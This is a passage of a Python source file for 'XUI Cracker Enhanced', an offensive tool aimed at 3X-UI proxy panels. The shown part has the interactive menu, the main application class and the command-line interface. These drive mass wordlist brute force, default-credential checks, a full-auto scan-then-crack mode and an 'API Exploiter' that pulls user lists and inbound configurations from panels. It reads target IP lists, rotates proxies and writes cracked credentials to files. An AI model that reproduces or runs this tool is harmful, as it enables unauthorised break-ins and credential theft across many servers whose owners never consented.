        DisplayManager.print_banner()

        menu = f"""
{Colors.CYAN}┌─────────────────────────────────────────────────────────────────────┐
{Colors.CYAN}│{Colors.YELLOW}                         ATTACK MODES                               {Colors.CYAN}│
{Colors.CYAN}├─────────────────────────────────────────────────────────────────────┤
{Colors.CYAN}│                                                                     │
{Colors.CYAN}│{Colors.GREEN}  [1]{Colors.WHITE} Standard Brute Force      {Colors.DIM}- Custom wordlist attack       {Colors.CYAN}│
{Colors.CYAN}│{Colors.GREEN}  [2]{Colors.WHITE} Default Credentials       {Colors.DIM}- Quick default creds check   {Colors.CYAN}│
{Colors.CYAN}│{Colors.GREEN}  [3]{Colors.WHITE} Full Auto Attack         {Colors.DIM}- Scan + Default + Brute Force {Colors.CYAN}│
{Colors.CYAN}│{Colors.GREEN}  [4]{Colors.WHITE} Scanner Mode             {Colors.DIM}- Just scan & identify XUI    {Colors.CYAN}│
{Colors.CYAN}│{Colors.GREEN}  [5]{Colors.WHITE} API Exploiter            {Colors.DIM}- Extract data from panels    {Colors.CYAN}│
{Colors.CYAN}│                                                                     │
{Colors.CYAN}├─────────────────────────────────────────────────────────────────────┤
{Colors.CYAN}│{Colors.YELLOW}  [0] Exit                                                             {Colors.CYAN}│
{Colors.CYAN}└─────────────────────────────────────────────────────────────────────┘{Colors.END}

{Colors.CYAN}[?] Select Mode: {Colors.END}", end=""
        
        return input()
        
    @staticmethod
    def print_found_credential(cred: Credential):
        """Print found credential with style - enhanced"""
        print(f"\n{Colors.BG_GREEN}{Colors.BLACK}  🔓 CREDENTIAL FOUND!  {Colors.END}")
        print(f"{Colors.GREEN}  ┌────────────────────────────────────────┐")
        print(f"{Colors.GREEN}  │{Colors.CYAN}  Target   : {Colors.WHITE}{cred.target_url:<32}{Colors.GREEN}│")
        print(f"{Colors.GREEN}  │{Colors.CYAN}  Username : {Colors.WHITE}{cred.username:<32}{Colors.GREEN}│")
        print(f"{Colors.GREEN}  │{Colors.CYAN}  Password : {Colors.WHITE}{cred.password:<32}{Colors.GREEN}│")
        print(f"{Colors.GREEN}  │{Colors.CYAN}  Method   : {Colors.WHITE}{cred.method:<32}{Colors.GREEN}│")
        print(f"{Colors.GREEN}  │{Colors.CYAN}  Time     : {Colors.WHITE}{cred.found_at:<32}{Colors.GREEN}│")
        print(f"{Colors.GREEN}  └────────────────────────────────────────┘{Colors.END}")

# ==================== FILE UTILITIES ====================
def load_list(filename: str) -> List[str]:
    """Load list from file, one item per line - with better error handling"""
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{Colors.RED}[-] File not found: {filename}{Colors.END}")
        return []
    except PermissionError:
        print(f"{Colors.RED}[-] Permission denied: {filename}{Colors.END}")
        return []
    except IOError as e:
        print(f"{Colors.RED}[-] Error reading {filename}: {e}{Colors.END}")
        return []

def save_results(credentials: List[Credential], filename: str = "xui_results.json"):
    """Save results to JSON file - with backup"""
    try:
        data = {
            'scan_date': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'total_found': len(credentials),
            'tool_version': VERSION,
            'credentials': [c.to_dict() for c in credentials]
        }
        
        # Save main file
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        print(f"{Colors.GREEN}[+] Results saved to {filename}{Colors.END}")
        
        # Create backup
        backup_filename = filename.replace('.json', f'_backup_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json')
        with open(backup_filename, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
            
    except (IOError, OSError) as e:
        print(f"{Colors.RED}[-] Error saving results: {e}{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}[-] Unexpected error saving: {e}{Colors.END}")

# ==================== MAIN APPLICATION ====================
class XUICrackerApp:
    """Main application class - enhanced v3.1"""
    
    def __init__(self):
        self.stats = Statistics()
        self.proxy_manager = ProxyManager()
        self.session_manager = SessionManager(self.proxy_manager)
        self.scanner = XUIScanner(self.session_manager)
        self.engine = BruteForceEngine(self.session_manager, self.stats)
        self.default_checker = DefaultCredentialsChecker(self.engine)
        self.api_exploiter = APIExploiter(self.session_manager)
        self.credentials: List[Credential] = []
        
    def load_targets(self, filename: str) -> List[Target]:
        """Load and parse targets from file - enhanced parsing"""
        ips = load_list(filename)
        targets = []
        
        for ip in ips:
            ip = ip.strip()
            if not ip or ip.startswith('#'):
                continue
                
            # Parse URL format
            if ip.startswith('http://') or ip.startswith('https://'):
                parsed = urlparse(ip)
                port = parsed.port or (443 if parsed.scheme == 'https' else 80)
                target = Target(
                    url=parsed.hostname or ip,
                    port=port,
                    protocol=parsed.scheme
                )
            else:
                # Parse IP:PORT format
                if ':' in ip:
                    parts = ip.rsplit(':', 1)
                    host = parts[0].strip()
                    try:
                        port = int(parts[1].strip())
                    except (ValueError, AttributeError):
                        port = 443
                else:
                    host = ip.strip()
                    port = 443
                    
                target = Target(url=host, port=port)
                
            targets.append(target)
            
        return targets
    
    def run_standard_attack(self):
        """Run standard brute force attack - fixed"""
        DisplayManager.print_banner()
        
        # Get inputs
        ip_file = input(f"{Colors.CYAN}[?] {Colors.WHITE}IP list file (IP:PORT): {Colors.END}").strip() or "ips.txt"
        user_file = input(f"{Colors.CYAN}[?] {Colors.WHITE}Username list file: {Colors.END}").strip() or "users.txt"
        pass_file = input(f"{Colors.CYAN}[?] {Colors.WHITE}Password list file: {Colors.END}").strip() or "passwords.txt"
        
        threads_input = input(f"{Colors.CYAN}[?] {Colors.WHITE}Threads (default 10): {Colors.END}").strip()
        try:
            threads = max(1, min(100, int(threads_input))) if threads_input else 10
        except (ValueError, TypeError):
            threads = 10  # FIXED: Was missing value
            
        # Load files
        targets = self.load_targets(ip_file)
        usernames = load_list(user_file)
        passwords = load_list(pass_file)
        
        if not targets or not usernames or not passwords:
            print(f"{Colors.RED}[-] Missing required files!{Colors.END}")
            return
            
        print(f"\n{Colors.GREEN}[+] Loaded: {len(targets)} IPs, {len(usernames)} Users, {len(passwords)} Passwords{Colors.END}")
        
        # Initialize output file
        with open("xui_good.txt", "w", encoding="utf-8") as f:
            f.write(f"# XUI Cracker Enhanced v{VERSION}\n")
            f.write(f"# Attack Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("#" + "=" * 70 + "\n\n")
        
        # Start stats updater
        stop_stats = threading.Event()
        def update_stats():
            while not stop_stats.is_set():
                DisplayManager.print_stats(self.stats, {'message': 'Running standard brute force attack...'})
                time.sleep(REFRESH_RATE)
        
        stats_thread = threading.Thread(target=update_stats, daemon=True)
        stats_thread.start()
        
        try:
            # Run attack
            found = self.engine.run_attack(targets, usernames, passwords, threads, "standard_brute_force")
            self.credentials.extend(found)
            
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[!] Attack interrupted by user{Colors.END}")
        finally:
            stop_stats.set()
            stats_thread.join(timeout=1)
            
        # Final stats
        DisplayManager.print_stats(self.stats)
        print(f"\n{Colors.GREEN}[+] Attack completed! Found {len(self.credentials)} credentials.{Colors.END}")
        print(f"{Colors.GREEN}[+] Check xui_good.txt for results.{Colors.END}")
        
        if self.credentials:
            save_results(self.credentials)
            
    def run_default_creds_check(self):
        """Run default credentials check - enhanced"""
        DisplayManager.print_banner()
        
        ip_file = input(f"{Colors.CYAN}[?] {Colors.WHITE}IP list file (IP:PORT): {Colors.END}").strip() or "ips.txt"
        
        targets = self.load_targets(ip_file)
        if not targets:
            print(f"{Colors.RED}[-] No targets loaded!{Colors.END}")
            return
            
        print(f"\n{Colors.GREEN}[+] Loaded {len(targets)} targets for default creds check{Colors.END}")
        
        # Initialize output
        with open("xui_good.txt", "w", encoding="utf-8") as f:
            f.write(f"# XUI Cracker Enhanced v{VERSION} - Default Credentials Check\n")
            f.write(f"# Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("#" + "=" * 70 + "\n\n")
        
        # Start stats
        stop_stats = threading.Event()
        def update_stats():
            while not stop_stats.is_set():
                DisplayManager.print_stats(self.stats, {'message': 'Checking default credentials...'})
                time.sleep(REFRESH_RATE)
        
        stats_thread = threading.Thread(target=update_stats, daemon=True)
        stats_thread.start()
        
        try:
            found = self.default_checker.check_targets(targets, threads=20)
            self.credentials.extend(found)
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[!] Interrupted{Colors.END}")
        finally:
            stop_stats.set()
            stats_thread.join(timeout=1)
            
        DisplayManager.print_stats(self.stats)
        print(f"\n{Colors.GREEN}[+] Completed! Found {len(found)} targets with default credentials.{Colors.END}")
        
    def run_full_auto(self):
        """Run full automatic attack - enhanced"""
        DisplayManager.print_banner()
        
        ip_file = input(f"{Colors.CYAN}[?] {Colors.WHITE}IP list file (IP:PORT): {Colors.END}").strip() or "ips.txt"
        user_file = input(f"{Colors.CYAN}[?] {Colors.WHITE}Username list file (optional): {Colors.END}").strip() or "users.txt"
        pass_file = input(f"{Colors.CYAN}[?] {Colors.WHITE}Password list file (optional): {Colors.END}").strip() or "passwords.txt"
        
        targets = self.load_targets(ip_file)
        usernames = load_list(user_file)
        passwords = load_list(pass_file)
        
        if not targets:
            print(f"{Colors.RED}[-] No targets loaded!{Colors.END}")
            return
            
        print(f"\n{Colors.GREEN}[+] Starting FULL AUTO ATTACK on {len(targets)} targets{Colors.END}")
        print(f"{Colors.YELLOW}[*] This will: Scan → Check Defaults → Brute Force{Colors.END}\n")
        
        # Initialize output
        with open("xui_good.txt", "w", encoding="utf-8") as f:
            f.write(f"# XUI Cracker Enhanced v{VERSION} - FULL AUTO ATTACK\n")
            f.write(f"# Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("#" + "=" * 70 + "\n\n")
        
        stop_stats = threading.Event()
        def update_stats():
            while not stop_stats.is_set():
                DisplayManager.print_stats(self.stats, {'message': 'Running full auto attack (Scan → Default → Brute)...'})
                time.sleep(REFRESH_RATE)
        
        stats_thread = threading.Thread(target=update_stats, daemon=True)
        stats_thread.start()
        
        try:
            # Phase 1: Scan
            print(f"{Colors.CYAN}[*] Phase 1/3: Scanning targets...{Colors.END}")
            valid_targets = []
            for i, target in enumerate(targets, 1):
                if self.engine.stop_event.is_set():
                    break
                print(f"{Colors.DIM}[*] Scanning [{i}/{len(targets)}]: {target.full_url}{Colors.END}", end="\r")
                result = self.scanner.is_xui_panel(target)
                if result.is_xui:
                    valid_targets.append(target)
                    print(f"\n{Colors.GREEN}[+] XUI found: {target.full_url}{Colors.END}")
                    if result.version:
                        print(f"{Colors.CYAN}    Version: {result.version}{Colors.END}")
                else:
                    self.stats.increment('bad')
                    
            print(f"\n{Colors.GREEN}[+] Found {len(valid_targets)} valid XUI panels{Colors.END}")
            
            # Phase 2: Default credentials
            print(f"\n{Colors.CYAN}[*] Phase 2/3: Checking default credentials...{Colors.END}")
            default_found = self.default_checker.check_targets(valid_targets, threads=15)
            self.credentials.extend(default_found)
            
            # Get remaining targets
            found_urls = {c.target_url for c in default_found}
            remaining = [t for t in valid_targets if t.full_url not in found_urls]
            
            # Phase 3: Brute force
            if remaining and usernames and passwords:
                print(f"\n{Colors.CYAN}[*] Phase 3/3: Running brute force on {len(remaining)} remaining targets...{Colors.END}")
                brute_found = self.engine.run_attack(remaining, usernames, passwords, threads=10, mode="full_auto")
                self.credentials.extend(brute_found)
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[!] Interrupted{Colors.END}")
        finally:
            stop_stats.set()
            stats_thread.join(timeout=1)
            
        DisplayManager.print_stats(self.stats)
        print(f"\n{Colors.GREEN}[+] FULL AUTO COMPLETE! Total credentials: {len(self.credentials)}{Colors.END}")
        save_results(self.credentials)
        
    def run_scanner_mode(self):
        """Run scanner mode only - enhanced"""
        DisplayManager.print_banner()
        
        ip_file = input(f"{Colors.CYAN}[?] {Colors.WHITE}IP list file (IP:PORT): {Colors.END}").strip() or "ips.txt"
        
        targets = self.load_targets(ip_file)
        if not targets:
            print(f"{Colors.RED}[-] No targets loaded!{Colors.END}")
            return
            
        print(f"\n{Colors.GREEN}[+] Scanning {len(targets)} targets for XUI panels...{Colors.END}\n")
        
        results = []
        for i, target in enumerate(targets, 1):
            print(f"{Colors.CYAN}[*] [{i}/{len(targets)}] Scanning {target.full_url}...{Colors.END}", end="\r")
            
            result = self.scanner.is_xui_panel(target)
            results.append(result)
            
            if result.is_xui:
                print(f"\n{Colors.GREEN}[+] XUI PANEL FOUND: {target.full_url}{Colors.END}")
                if result.version:
                    print(f"{Colors.CYAN}    Version: {result.version}{Colors.END}")
                if result.vulnerabilities:
                    vulns = [v for v in result.vulnerabilities if not v.startswith('potential_')]
                    if vulns:
                        print(f"{Colors.YELLOW}    Vulnerabilities: {', '.join(vulns)}{Colors.END}")
                    
            self.stats.increment('targets_scanned')
            time.sleep(0.05)
            
        print(f"\n\n{Colors.GREEN}[+] Scan complete!{Colors.END}")
        print(f"{Colors.CYAN}[*] Total scanned: {len(targets)}{Colors.END}")
        print(f"{Colors.GREEN}[*] XUI panels found: {sum(1 for r in results if r.is_xui)}{Colors.END}")
        
        # Save scan results
        scan_data = {
            'scan_date': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'total_targets': len(targets),
            'xui_found': [r.target.full_url for r in results if r.is_xui],
            'details': [
                {
                    'url': r.target.full_url,
                    'is_xui': r.is_xui,
                    'version': r.version,
                    'vulnerabilities': r.vulnerabilities,
                    'endpoints': r.endpoints,
                    'response_time': r.target.response_time
                } for r in results
            ]
        }
        
        with open("xui_scan_results.json", "w", encoding="utf-8") as f:
            json.dump(scan_data, f, indent=2, ensure_ascii=False)
            
        print(f"{Colors.GREEN}[+] Results saved to xui_scan_results.json{Colors.END}")
        
    def run_api_exploit(self):
        """Run API exploiter mode - enhanced"""
        DisplayManager.print_banner()
        
        target_url = input(f"{Colors.CYAN}[?] {Colors.WHITE}Target XUI URL: {Colors.END}").strip()
        session_token = input(f"{Colors.CYAN}[?] {Colors.WHITE}Session Token (if available): {Colors.END}").strip() or None
        
        if not target_url:
            print(f"{Colors.RED}[-] Target URL required!{Colors.END}")
            return
            
        if not target_url.startswith('http'):
            target_url = "https://" + target_url
            
        parsed = urlparse(target_url)
        target = Target(
            url=parsed.hostname,
            port=parsed.port or 443,
            protocol=parsed.scheme
        )
        
        print(f"\n{Colors.YELLOW}[*] Exploiting API endpoints on {target.full_url}...{Colors.END}\n")
        
        results = self.api_exploiter.exploit_target(target, session_token)
        
        print(f"{Colors.GREEN}[+] Exploitation complete!{Colors.END}\n")
        print(f"{Colors.CYAN}[*] Accessible Endpoints: {', '.join(results['accessible_endpoints'])}{Colors.END}")
        
        if results['version']:
            print(f"{Colors.CYAN}[*] XRay Version: {results['version']}{Colors.END}")
            
        if results['inbounds']:
            print(f"\n{Colors.GREEN}[+] Found {len(results['inbounds'])} inbound configurations:{Colors.END}")
            for i, inbound in enumerate(results['inbounds'][:5], 1):
                print(f"{Colors.CYAN}    {i}. Protocol: {inbound.get('protocol', 'unknown')}, Port: {inbound.get('port', 'unknown')}{Colors.END}")
                
        if results['users']:
            print(f"\n{Colors.GREEN}[+] Found {len(results['users'])} users:{Colors.END}")
            for user in results['users'][:5]:
                print(f"{Colors.CYAN}    - {user.get('username', 'unknown')}{Colors.END}")
                
        # Save results
        with open("xui_api_exploit.json", "w", encoding="utf-8") as f:
            json.dump(results, f, indent=2, ensure_ascii=False, default=str)
        print(f"\n{Colors.GREEN}[+] Full results saved to xui_api_exploit.json{Colors.END}")
        
    def run(self):
        """Main application loop"""
        while True:
            choice = DisplayManager.print_menu()
            
            if choice == '0':
                print(f"\n{Colors.CYAN}[*] Goodbye! 👋{Colors.END}")
                break
            elif choice == '1':
                self.run_standard_attack()
                input(f"\n{Colors.CYAN}[?] Press Enter to continue...{Colors.END}")
            elif choice == '2':
                self.run_default_creds_check()
                input(f"\n{Colors.CYAN}[?] Press Enter to continue...{Colors.END}")
            elif choice == '3':
                self.run_full_auto()
                input(f"\n{Colors.CYAN}[?] Press Enter to continue...{Colors.END}")
            elif choice == '4':
                self.run_scanner_mode()
                input(f"\n{Colors.CYAN}[?] Press Enter to continue...{Colors.END}")
            elif choice == '5':
                self.run_api_exploit()
                input(f"\n{Colors.CYAN}[?] Press Enter to continue...{Colors.END}")
            else:
                print(f"{Colors.RED}[-] Invalid choice!{Colors.END}")
                time.sleep(1)

# ==================== CLI INTERFACE ====================
def main():
    """CLI entry point - fixed COLORS typo"""
    parser = argparse.ArgumentParser(
        description=f'XUI Cracker Enhanced v{VERSION} - Advanced 3X-UI Panel Security Toolkit',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python xui_cracker.py                    # Interactive mode
  python xui_cracker.py --mode auto --targets ips.txt
  python xui_cracker.py --mode default --targets ips.txt -t 20
  python xui_cracker.py --scan-only --targets ips.txt
        """
    )
    
    parser.add_argument('--mode', '-m', choices=['standard', 'default', 'auto', 'scan', 'api'],
                        help='Attack mode')
    parser.add_argument('--targets', '-t', help='Target IP list file')
    parser.add_argument('--users', '-u', help='Username list file')
    parser.add_argument('--passwords', '-p', help='Password list file')
    parser.add_argument('--threads', type=int, default=10, help='Number of threads (default: 10)')
    parser.add_argument('--proxy-file', help='Proxy list file')
    parser.add_argument('--output', '-o', help='Output file')
    parser.add_argument('--delay', type=float, default=0.1, help='Delay between requests')
    parser.add_argument('--scan-only', action='store_true', help='Only scan, no attack')
    parser.add_argument('--target-url', help='Single target URL (for API mode)')
    parser.add_argument('--session-token', help='Session token for API mode')
    
    args = parser.parse_args()
    
    # If no arguments, run interactive mode
    if len(sys.argv) == 1:
        app = XUICrackerApp()
        app.run()
        return
        
    # CLI mode
    app = XUICrackerApp()
    
    # Load proxies if provided
    if args.proxy_file:
        app.proxy_manager.load_from_file(args.proxy_file)
    
    try:
        if args.mode == 'scan' or args.scan_only:
            if not args.targets:
                print(f"{Colors.RED}[-] --targets required for scan mode{Colors.END}")
                return
            targets = app.load_targets(args.targets)
            for target in targets:
                result = app.scanner.is_xui_panel(target)
                if result.is_xui:
                    print(f"{Colors.GREEN}[+] XUI: {target.full_url} (v{result.version}){Colors.END}")
                    
        elif args.mode == 'default':
            if not args.targets:
                print(f"{Colors.RED}[-] --targets required{Colors.END}")
                return
            targets = app.load_targets(args.targets)
            found = app.default_checker.check_targets(targets, args.threads)
            print(f"{Colors.GREEN}[+] Found {len(found)} with default credentials{Colors.END}")
            
        elif args.mode == 'auto':
            if not args.targets:
                print(f"{Colors.RED}[-] --targets required{Colors.END}")
                return
            targets = app.load_targets(args.targets)
            usernames = load_list(args.users) if args.users else ['admin']
            passwords = load_list(args.passwords) if args.passwords else ['admin']
            
            # Run full auto
            valid_targets = []
            for target in targets:
                result = app.scanner.is_xui_panel(target)
                if result.is_xui:
                    valid_targets.append(target)
                    
            print(f"{Colors.CYAN}[*] Found {len(valid_targets)} XUI panels{Colors.END}")
            
            default_found = app.default_checker.check_targets(valid_targets, args.threads)
            app.credentials.extend(default_found)
            
            found_urls = {c.target_url for c in default_found}
            remaining = [t for t in valid_targets if t.full_url not in found_urls]
            if remaining:
                brute_found = app.engine.run_attack(remaining, usernames, passwords, args.threads)
                app.credentials.extend(brute_found)
                
            print(f"{Colors.GREEN}[+] Total found: {len(app.credentials)}{Colors.END}")
            
        elif args.mode == 'api':
            if not args.target_url:
                # FIXED: Was COLORS.RED instead of Colors.RED
                print(f"{Colors.RED}[-] --target-url required for API mode{Colors.END}")
                return
            parsed = urlparse(args.target_url)
            target = Target(
                url=parsed.hostname,
                port=parsed.port or 443,
                protocol=parsed.scheme or 'https'
            )
            results = app.api_exploiter.exploit_target(target, args.session_token)
            print(json.dumps(results, indent=2, default=str))
            
        else:  # standard
            if not args.targets or not args.users or not args.passwords:
                print(f"{Colors.RED}[-] --targets, --users, --passwords required{Colors.END}")
                return
            targets = app.load_targets(args.targets)
            usernames = load_list(args.users)
            passwords = load_list(args.passwords)
            
            found = app.engine.run_attack(targets, usernames, passwords, args.threads)
            print(f"{Colors.GREEN}[+] Found {len(found)} credentials{Colors.END}")
            
        # Save results
        if app.credentials:
            output_file = args.output or "xui_results.json"
            save_results(app.credentials, output_file)
            
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Interrupted{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}[-] Error: {e}{Colors.END}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}![!] Exited by user{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}![!] Fatal error: {e}{Colors.END}")
